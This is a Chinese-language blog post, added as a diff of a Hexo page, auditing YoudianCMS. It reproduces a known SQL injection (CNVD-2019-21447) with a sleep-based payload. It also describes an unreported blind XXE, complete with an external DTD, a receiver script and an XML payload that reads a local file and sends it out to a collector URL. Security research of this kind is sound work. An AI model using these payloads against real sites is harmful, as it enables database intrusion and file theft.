@@ -1,0 +1,480 @@
+
+
+<!DOCTYPE html>
+<html lang="en" color-mode=light>
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>某企业管理系统审计小结 - rt</title>
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="google" content="notranslate" />
+  
+  <meta name="description" content="1@ 前言md 国庆睡的太爽了,睡爽了起来审一审 : ...">
+  <meta name="author" content="rt">
+  <link rel="icon" href="/images/icons/favicon-16x16.png" type="image/png" sizes="16x16">
+  <link rel="icon" href="/images/icons/favicon-32x32.png" type="image/png" sizes="32x32">
+  <link rel="apple-touch-icon" href="/images/icons/apple-touch-icon.png" sizes="180x180">
+  <meta rel="mask-icon" href="/images/icons/stun-logo.svg" color="#333333">
+  
+    <meta rel="msapplication-TileImage" content="/images/icons/favicon-144x144.png">
+    <meta rel="msapplication-TileColor" content="#000000">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+    
+<link rel="stylesheet" href="https://at.alicdn.com/t/font_1445822_p6ry5n7lrr.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  
+
+  
+    
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/nord.min.css" name="highlight-style" mode="light">
+
+      
+        
+        
+<link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.18.1/styles/nord.min.css" name="highlight-style" mode="dark">
+
+      
+  
+
+  <script>
+    var CONFIG = window.CONFIG || {};
+    var ZHAOO = window.ZHAOO || {};
+    CONFIG = {
+      isHome: false,
+      fancybox: true,
+      pjax: false,
+      loading: {
+        gif: '/images/theme/loading.gif',
+        lottie: ''
+      },
+      lazyload: {
+        enable: true,
+        only_post: 'false',
+        loading: {
+          gif: '/images/theme/loading.gif',
+          lottie: ''
+        }
+      },
+      donate: {
+        enable: false,
+        alipay: 'https://pic.izhaoo.com/alipay.jpg',
+        wechat: 'https://pic.izhaoo.com/wechat.jpg'
+      },
+      galleries: {
+        enable: true
+      },
+      fab: {
+        enable: true,
+        always_show: false
+      },
+      carrier: {
+        enable: true
+      },
+      daovoice: {
+        enable: false
+      },
+      preview: {
+        background: {
+          default: '',
+          api: ''
+        },
+        motto: {
+          default: '',
+          typing: true,
+          api: '',
+          data_contents: '["data","content"]'
+        },
+      },
+      qrcode: {
+        enable: true,
+        type: 'url',
+        image: 'https://i.328888.xyz/2023/04/13/igT1lV.jpeg',
+      },
+      toc: {
+        enable: true
+      },
+      scrollbar: {
+        type: 'default'
+      },
+      notification: {
+        enable: false,
+        delay: 4500,
+        list: '',
+        page_white_list: '',
+        page_black_list: ''
+      },
+      search: {
+        enable: false,
+        path: ''
+      }
+    }
+  </script>
+
+  
+
+  
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="lock-screen">
+  <div class="loading" id="loading"></div>
+  
+    
+
+
+  <nav class="navbar">
+    <div class="left">
+      
+        <i class="iconfont iconhome j-navbar-back-home"></i>
+      
+      
+        <i class="iconfont iconqrcode j-navbar-qrcode"></i>
+      
+      
+        <i class="iconfont iconmoono" id="color-toggle" color-toggle="light"></i>
+      
+      
+    </div>
+    <div class="center">某企业管理系统审计小结</div>
+    <div class="right">
+      <i class="iconfont iconmenu j-navbar-menu"></i>
+    </div>
+    
+      <div id="qrcode-navbar"></div>
+    
+  </nav>
+
+  
+  
+
+<nav class="menu">
+  <div class="menu-container">
+    <div class="menu-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <ul class="menu-content"><li class="menu-item">
+        <a href="/ " class="underline "> 首页</a>
+      </li><li class="menu-item">
+        <a href="/archives/ " class="underline "> 归档</a>
+      </li><li class="menu-item">
+        <a href="/about/ " class="underline "> 关于</a>
+      </li><li class="menu-item">
+        <a href="/articles/ " class="underline "> 文章</a>
+      </li></ul>
+    
+      <div class="menu-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">rt</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+    
+  </div>
+</nav>
+  <main id="main">
+  <div class="article-wrap">
+    <div class="row container">
+      <div class="col-xl-3"></div>
+      <div class="col-xl-6"><article class="article">
+  <div class="wrap">
+    <section class="head">
+  <img   class="lazyload" data-original="/images/theme/post-image.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="  draggable="false">
+  <div class="head-mask">
+    <h1 class="head-title">某企业管理系统审计小结</h1>
+    <div class="head-info">
+      <span class="post-info-item"><i class="iconfont iconcalendar"></i>October 06, 2019</span>
+      
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>7492</span>
+    </div>
+  </div>
+</section>
+    <section class="main">
+      <section class="content">
+        
+        <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1@ 前言"></a>1@ 前言</h1><p>md 国庆睡的太爽了,睡爽了起来审一审 : p</p>
+<p>这次拿到的 youdiancms 是基于 tp 开发的一套简单的企业网站管理系统。cnvd 上收录关于其系统的漏洞只有星星点点的几个,故拿来复现练手,同时看看能不能再审出点自己的小洞~</p>
+<h1 id="2-CNVD-2019-21447-前台-sql-注入"><a href="#2-CNVD-2019-21447-前台-sql-注入" class="headerlink" title="2@ CNVD-2019-21447 前台 sql 注入"></a>2@ CNVD-2019-21447 前台 sql 注入</h1><p>条件:</p>
+<ul>
+<li>开启会员注册功能.</li>
+<li>用已经注册过得会员登录.</li>
+</ul>
+<p>由于基于 tp 开发,所以其路由规则就是类于 <code>/功能模块/类/方法/参数</code> 的 PATH_INFO 的模式.</p>
+<p>在运行过程中,会动态生成一个主文件 —&gt; <code>yunxingshi.php</code>,由于写入的时候并没有考虑到排版问题,所以为了便于审计,我们可以在<a target="_blank" rel="noopener" href="http://tools.jb51.net/code/phpformat">这里</a>进行代码格式的美化.</p>
+<p>这里我们省去路由传入参数的过程,着重来学习下在框架开发的模式下,从数据库中存取数据的流程.为了方便调试演示,直接给出存在问题的方法:</p>
+<ul>
+<li><p>App&#x2F;Lib&#x2F;Action&#x2F;Member&#x2F;CustomerAction&#x2F; 下的 saveModify 的方法</p>
+</li>
+<li><p>演示 url : <code>http://cms.test1/index.php/Member/Customer/saveModify</code></p>
+<p><code>POST : MemberName=root1&amp;MemberID=1 and sleep(5);#</code></p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">saveModify</span></span>()&#123;<br>		header(<span class="hljs-string">&quot;Content-Type:text/html; charset=utf-8&quot;</span>);<br>		<span class="hljs-variable">$this</span>-&gt;_checkPost( <span class="hljs-variable">$_POST</span> );<br>		<span class="hljs-built_in">unset</span>( <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;InviterID&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;IsEnable&#x27;</span>]);<br>		<span class="hljs-variable">$m</span> = D(<span class="hljs-string">&#x27;Admin/Member&#x27;</span>);<br>		<span class="hljs-variable">$inviterID</span> = <span class="hljs-variable">$m</span>-&gt;<span class="hljs-built_in">where</span>(<span class="hljs-string">&quot;MemberID=&#123;<span class="hljs-variable">$_POST</span>[&#x27;MemberID&#x27;]&#125;&quot;</span>)-&gt;getField(<span class="hljs-string">&#x27;InviterID&#x27;</span>);<br>......<br></code></pre></td></tr></table></figure>
+
+<p>可以看到,传入的 MemberID 参数,经过简单的处理,就直接带到了类的 where 方法里面进行查询了,如果包装类的方法再没有处理过程,那么很有可能产生注入,我们跟进观察.</p>
+<p>1、首先跟进到 _checkPost() 方法中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_checkPost</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>)</span>&#123;<br>		<span class="hljs-keyword">if</span>( <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;MemberName&#x27;</span>]) )&#123;<br>			<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">ajaxReturn</span>(<span class="hljs-literal">null</span>, <span class="hljs-string">&#x27;昵称不能为空&#x27;</span> , <span class="hljs-number">0</span>);<br>		&#125;<br>		<br>		<span class="hljs-keyword">if</span>( <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;MemberPassword&#x27;</span>] != <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>			<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;MemberPassword&#x27;</span>] = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;MemberPassword&#x27;</span>]);<br>		&#125;<span class="hljs-keyword">else</span>&#123;<br>			<span class="hljs-keyword">unset</span>( <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;MemberPassword&#x27;</span>] );<br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>没有进行传 入参数的过滤,只是提醒我们必须传入 MemberName 这个参数,否则返回错误提示信息.</p>
+<p>2、接着 D() 方法大致流程就是新建一个模型类实例，然后返回</p>
+<p>3、然后就到了关键的带入到实例中 where 方法中，我们来着重看看整个数据的流动过程：</p>
+<ul>
+<li>没有 where 方法，首先调用到 __call() 这个魔术方法，来判断需要进行的操作。</li>
+</ul>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">public <span class="hljs-keyword">function</span> __call(<span class="hljs-variable">$method</span>,<span class="hljs-variable">$args</span>) &#123;<br>        <span class="hljs-keyword">if</span>(in_array(strtolower(<span class="hljs-variable">$method</span>),array(<span class="hljs-string">&#x27;table&#x27;</span>,<span class="hljs-string">&#x27;where&#x27;</span>,<span class="hljs-string">&#x27;order&#x27;</span>,<span class="hljs-string">&#x27;limit&#x27;</span>,<span class="hljs-string">&#x27;page&#x27;</span>,<span class="hljs-string">&#x27;alias&#x27;</span>,<span class="hljs-string">&#x27;having&#x27;</span>,<span class="hljs-string">&#x27;group&#x27;</span>,<span class="hljs-string">&#x27;lock&#x27;</span>,<span class="hljs-string">&#x27;distinct&#x27;</span>),true)) &#123;<br>            <span class="hljs-regexp">//</span> 连贯操作的实现<br>            <span class="hljs-variable">$this</span>-&gt;options[strtolower(<span class="hljs-variable">$method</span>)] =   <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>];  <span class="hljs-regexp">//</span> <span class="hljs-variable">$method</span>=where ; <span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>]= ‘MemberID=<span class="hljs-number">1</span> and sleep(<span class="hljs-number">3</span>);<span class="hljs-comment">#’</span><br>            return <span class="hljs-variable">$this</span>;<br>            ......<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>返回 this 接着上面的链式调用，访问 getField() 方法，其中有一个 _parseOptions() 的方法，跟进查看：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_parseOptions</span>(<span class="hljs-params"><span class="hljs-variable">$options</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>) </span>&#123;<br>      <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$options</span>))<br>          <span class="hljs-variable">$options</span> =  <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;options,<span class="hljs-variable">$options</span>);<br>      <span class="hljs-comment">// 查询过后清空sql表达式组装 避免影响下次查询</span><br>      <span class="hljs-variable language_">$this</span>-&gt;options  =   <span class="hljs-keyword">array</span>();<br>      <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;table&#x27;</span>]))<br>          <span class="hljs-comment">// 自动获取表名</span><br>          <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;table&#x27;</span>] =<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getTableName</span>();<br>      <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;alias&#x27;</span>])) &#123;<br>          <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;table&#x27;</span>]   .= <span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;alias&#x27;</span>];<br>      &#125;<br>      <span class="hljs-comment">// 记录操作的模型名称</span><br>      <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;model&#x27;</span>] =  <span class="hljs-variable language_">$this</span>-&gt;name;<br>   <br>   ......<br>   <br>      <span class="hljs-comment">// 表达式过滤</span><br>      <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">_options_filter</span>(<span class="hljs-variable">$options</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable">$options</span>;<br>  &#125;<br></code></pre></td></tr></table></figure>
+
+<p>解析传入参数，为拼接查询语句做准备，注意里面有一个 _options_filter() 跟进查看：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_options_filter</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$options</span></span>) </span>&#123;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>md 竟然是个空函数哈哈，我猜这可能是开发者为了之后爆出漏洞好修补直接首先写好的一个占位函数，至于具体怎么修，还得等待白帽子们怎么破了，有意思。</p>
+<ul>
+<li>返回到 getField() 方法中，查询的是一个字段，所以我们直接跳到 else 分支：</li>
+</ul>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">else</span>&#123;   <span class="hljs-regexp">//</span> 查找一条记录<br>          $options[<span class="hljs-string">&#x27;limit&#x27;</span>] = <span class="hljs-number">1</span>;<br>          $result = $this-&gt;db-&gt;<span class="hljs-keyword">select</span>($options);<br>          <span class="hljs-keyword">if</span>(!empty($result)) &#123;<br>              <span class="hljs-keyword">return</span> <span class="hljs-keyword">reset</span>($result[<span class="hljs-number">0</span>]);<br>          &#125;<br>      &#125;<br></code></pre></td></tr></table></figure>
+
+<p>跟进到模型实例的数据库资源中进行查询：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// select 方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">select</span>(<span class="hljs-params"><span class="hljs-variable">$options</span>=<span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;model  =   <span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;model&#x27;</span>];<br>        <span class="hljs-variable">$sql</span>   = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">buildSelectSql</span>(<span class="hljs-variable">$options</span>);<br>        <span class="hljs-comment">// 构造的 sql 语句为 select ‘InviterID’ FROM ‘youdian_member’ WHERE MemberID=2 and sleep(3);#limit1</span><br>        <br>        <span class="hljs-variable">$cache</span>  =  <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;cache&#x27;</span>])?<span class="hljs-variable">$options</span>[<span class="hljs-string">&#x27;cache&#x27;</span>]:<span class="hljs-literal">false</span>;<br> ......<br>      <br>        <span class="hljs-variable">$result</span>   = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure>
+
+<p>带入到数据库中进行查询，造成 sql 注入。</p>
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./1.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>整个过程不难，我主要想要总结的是这套系统运作后台数据库的方法和设计模式：</p>
+<p>由于用户使用的数据库扩展类型是未知的，所以代码需要根据不同情况选择不同的数据库连接:</p>
+<ul>
+<li>所有数据库对象的基类 <code>App/Core/Lib/Core/Db.class.php</code>,此系统支持 mysql 和 mysqli 两个扩展，根据选择情况来构建数据库对象，继承父类的一些声明和方法即可直接进行使用。</li>
+<li>工厂模式：工厂模式就是将创造对象的方法封装在一个文件的类函数里面，然后返回创建的对象，避免了 new 操作，而且当创建对象的方法或者参数改变的时候，我们可以直接修改工厂方法。</li>
+</ul>
+<p>这里的父类 Db.class.php 使用了工厂模式产生数据库对象，即 <strong>factory()</strong> 方法：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs awk">public <span class="hljs-keyword">function</span> factory(<span class="hljs-variable">$db_config</span>=<span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>        <span class="hljs-regexp">//</span> 读取数据库配置<br>        <span class="hljs-variable">$db_config</span> = <span class="hljs-variable">$this</span>-&gt;parseConfig(<span class="hljs-variable">$db_config</span>);<br>        <span class="hljs-keyword">if</span>(empty(<span class="hljs-variable">$db_config</span>[<span class="hljs-string">&#x27;dbms&#x27;</span>]))<br>            throw_exception(L(<span class="hljs-string">&#x27;_NO_DB_CONFIG_&#x27;</span>));<br>        <span class="hljs-regexp">//</span> 数据库类型<br>        <span class="hljs-variable">$this</span>-&gt;dbType = ucwords(strtolower(<span class="hljs-variable">$db_config</span>[<span class="hljs-string">&#x27;dbms&#x27;</span>]));<br>        <span class="hljs-variable">$class</span> = <span class="hljs-string">&#x27;Db&#x27;</span>. <span class="hljs-variable">$this</span>-&gt;dbType;<br>        <span class="hljs-keyword">if</span>(is_file(CORE_PATH.<span class="hljs-string">&#x27;Driver/Db/&#x27;</span>.<span class="hljs-variable">$class</span>.<span class="hljs-string">&#x27;.class.php&#x27;</span>)) &#123;<br>            <span class="hljs-regexp">//</span> 内置驱动<br>            <span class="hljs-variable">$path</span> = CORE_PATH;<br>        &#125;<span class="hljs-keyword">else</span>&#123; <span class="hljs-regexp">//</span> 扩展驱动<br>            <span class="hljs-variable">$path</span> = EXTEND_PATH;<br>        &#125;<br>        <span class="hljs-regexp">//</span> 检查驱动类<br>        <span class="hljs-keyword">if</span>(require_cache(<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;Driver/Db/&#x27;</span>.<span class="hljs-variable">$class</span>.<span class="hljs-string">&#x27;.class.php&#x27;</span>)) &#123;<br>            <span class="hljs-variable">$db</span> = new <span class="hljs-variable">$class</span>(<span class="hljs-variable">$db_config</span>);<br>            <span class="hljs-regexp">//</span> 获取当前的数据库类型<br>            <span class="hljs-keyword">if</span>( <span class="hljs-string">&#x27;pdo&#x27;</span> != strtolower(<span class="hljs-variable">$db_config</span>[<span class="hljs-string">&#x27;dbms&#x27;</span>]) )<br>                <span class="hljs-variable">$db</span>-&gt;dbType = strtoupper(<span class="hljs-variable">$this</span>-&gt;dbType);<br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-variable">$db</span>-&gt;dbType = <span class="hljs-variable">$this</span>-&gt;_getDsnType(<span class="hljs-variable">$db_config</span>[<span class="hljs-string">&#x27;dsn&#x27;</span>]);<br>            <span class="hljs-keyword">if</span>(APP_DEBUG)  <span class="hljs-variable">$db</span>-&gt;debug    = true;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-regexp">//</span> 类没有定义<br>            throw_exception(L(<span class="hljs-string">&#x27;_NOT_SUPPORT_DB_&#x27;</span>).<span class="hljs-string">&#x27;: &#x27;</span> . <span class="hljs-variable">$db_config</span>[<span class="hljs-string">&#x27;dbms&#x27;</span>]);<br>        &#125;<br>        return <span class="hljs-variable">$db</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后在构造函数 __construct() 中使用此方法创建数据库对象：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$config</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">factory</span>(<span class="hljs-variable">$config</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>php 有很多设计模式我们可以了解和学习，<a target="_blank" rel="noopener" href="https://www.imooc.com/learn/236">这里</a>是慕课的一个不错的免费讲解设计模式的课程。</p>
+<p>ps: 同样的分析方法还能发现一个前台 xss 漏洞。</p>
+<h1 id="3-前台-xxe"><a href="#3-前台-xxe" class="headerlink" title="3@ 前台 xxe"></a>3@ 前台 xxe</h1><p>以前一直觉得 xxe 这种漏洞很少会在实战中出现，这也算是自己第一次实战审出 xxe ,由于利用条件比较苛刻，没有上报到 cnvd 等平台，在此做下简单分析 (为了保护厂家隐私，此文章已经上密码，仅做笔记和供朋友参阅，望大家注意自身安全)。</p>
+<p>文件位置：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/App/</span>Lib<span class="hljs-regexp">/Common/</span>YdWx.class.php<br><span class="hljs-regexp">//</span> 关键方法<br>public <span class="hljs-keyword">function</span> responseMsg()&#123;<br>		<span class="hljs-regexp">//</span><span class="hljs-variable">$postStr</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;HTTP_RAW_POST_DATA&quot;</span>];	<span class="hljs-regexp">//g</span>et post data, May be due to the different environments<br>        <span class="hljs-variable">$postStr</span> = file_get_contents(<span class="hljs-string">&quot;php://input&quot;</span>);<br>		<span class="hljs-keyword">if</span> (empty(<span class="hljs-variable">$postStr</span>) ) return;<br>		<span class="hljs-variable">$HasCustomerService</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;Config&#x27;</span>][<span class="hljs-string">&#x27;WX_CUSTOMER_SERVICE&#x27;</span>]; <span class="hljs-regexp">//</span>是否启用多客服<br>		<span class="hljs-regexp">//</span>用户发送消息－&gt; 公众帐号<br>		<span class="hljs-variable">$postObj</span> = simplexml_load_string(<span class="hljs-variable">$postStr</span>, <span class="hljs-string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOCDATA);<br>		......<br></code></pre></td></tr></table></figure>
+
+<p>可以看到，此方法将 post 流中的数据直接放入到 <code>simplexml_load_string()</code> 函数中，由于此方法未传入其他参数，所以只要有使用此方法的地方，必然会有 xxe 漏洞。</p>
+<p>由于本机未装 php 5.6 以下版本，所以本次测试环境为 :</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">os</span> : win10<br><span class="hljs-attribute">php_version</span> : <span class="hljs-number">5</span>.<span class="hljs-number">4</span>.<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure>
+
+<p>网上很多文章都有写 libxml 2.9.1 以上的 php 默认会禁止加载外部实体，实际上 libxml 2.9.4 这一版的 php 依旧可以成功加载外部实体。因为 php 7.0 以上的版本集成的 libxml 还是有 2.9.4 版，所以此漏洞也是可以在 php7 上复现的，这个问题由 Cart0a 提出。具体禁用加载外部实体的 libxml 版本有待探索。</p>
+<p>由于是无回显形式的 xxe，所以我们需要构造一个数据接收方：</p>
+<ul>
+<li>我们先在本地上传模拟测试实体 <code>test.dtd</code></li>
+</ul>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///C:/Windows/win.ini&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://127.0.0.1/receive.php?p=%file;&#x27;&gt;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>然后构造接收脚本 <code>receive.php</code></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;result.txt&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>最后将 payload 传入到 post 流中，偷取到的数据写入到 <code>result.txt</code> 文件中</li>
+</ul>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">convert</span> [ </span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://127.0.0.1/test.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%remote;%int;%send;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img   class="lazyload" data-original="https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/%E6%9F%90%E7%B3%BB%E7%BB%9F./2.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>【由于图片需要上传需要打码，复现可根据上文文字步骤进行】</p>
